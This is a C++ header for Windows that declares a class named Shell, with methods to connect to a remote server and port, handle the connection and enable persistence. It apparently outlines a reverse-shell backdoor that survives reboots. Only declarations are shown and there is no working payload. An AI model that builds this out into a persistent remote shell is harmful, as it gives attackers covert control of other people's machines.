#pragma once

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>
#include <shlobj.h>

class Shell
{
public:
    Shell();
    ~Shell();
    void connectToServer(const std::string& remoteServer, int port);
    void enablePersistence();

private:
    WSADATA wsaData;
    SOCKET createSocket();
    void cleanupSocket(SOCKET& socket);
    void handleConnection(SOCKET& connectSocket);
};